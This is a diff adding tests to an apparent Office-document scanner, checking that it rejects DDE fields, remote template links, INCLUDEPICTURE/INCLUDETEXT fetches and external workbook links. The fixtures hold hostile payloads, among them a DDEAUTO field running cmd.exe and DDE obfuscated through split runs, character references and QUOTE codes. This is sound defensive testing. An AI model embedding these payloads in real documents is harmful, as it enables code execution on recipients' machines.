@@ -155,6 +155,16 @@ describe('OOXML external relationships', () => {
     }
   });
 
+  it('does not let a namespace declaration stand in for the attribute', async () => {
+    const xml = '<Relationships><Relationship xmlns:TargetMode="urn:benign" Id="r1" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>';
+    expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', xml]]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+  });
+
+  it('refuses a link to another workbook (externalLink, where DDE links live)', async () => {
+    const xml = '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/></Relationships>';
+    expect(await code(inspectOffice(await docx([['word/_rels/document.xml.rels', xml]]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+  });
+
   it('refuses a DTD and malformed XML rather than guessing', async () => {
     const dtd = '<!DOCTYPE r [<!ENTITY e "External">]><Relationships><Relationship Id="r1" Target="x" TargetMode="&e;"/></Relationships>';
     const broken = '<Relationships><Relationship Id="r1" Target="<x" TargetMode="External"/></Relationships>';
@@ -165,6 +175,36 @@ describe('OOXML external relationships', () => {
 
   it('allows internal relationships', async () => {
     expect(await code(inspectOffice(await docx([rels('"Internal"')]), 'docx'))).toBe('ok');
+  });
+});
+
+describe('Word fields', () => {
+  const body = (inner) => `<w:document><w:body><w:p>${inner}</w:p></w:body></w:document>`;
+  const withBody = (inner, part = 'word/document.xml') => zipFile([
+    ['[Content_Types].xml', CT],
+    ['word/document.xml', part === 'word/document.xml' ? body(inner) : body('')],
+    ...(part === 'word/document.xml' ? [] : [[part, body(inner)]]),
+  ]);
+  const run = (instr) => `<w:r><w:instrText xml:space="preserve">${instr}</w:instrText></w:r>`;
+
+  it.each([
+    ['a simple DDEAUTO field', '<w:fldSimple w:instr=" DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc&quot; "/>'],
+    ['DDE split across runs', `<w:r><w:fldChar w:fldCharType="begin"/></w:r>${run(' DD')}${run('EAUTO c:\\x.exe')}<w:r><w:fldChar w:fldCharType="end"/></w:r>`],
+    ['DDE spelled with a character reference', run(' &#68;DE c:\\x.exe')],
+    ['DDE built from QUOTE character codes', run(' QUOTE 68 68 69 65 85 84 79')],
+    ['INCLUDEPICTURE of a URL', run(' INCLUDEPICTURE "https://evil.example/p.png" \\d')],
+    ['INCLUDETEXT of a share', run(' INCLUDETEXT "\\\\\\\\server\\\\x.docx"')],
+  ])('refuses %s', async (_label, inner) => {
+    expect(await code(inspectOffice(await withBody(inner), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+  });
+
+  it('reads headers and footers too', async () => {
+    expect(await code(inspectOffice(await withBody(run(' DDE x'), 'word/header1.xml'), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+  });
+
+  it('allows ordinary fields, and the words as text', async () => {
+    const inner = `${run(' PAGE ')}<w:fldSimple w:instr=" DATE \\@ &quot;d.M.yyyy&quot; "/><w:r><w:t>DDE and QUOTE 1 in plain text</w:t></w:r>`;
+    expect(await code(inspectOffice(await withBody(inner), 'docx'))).toBe('ok');
   });
 });
 
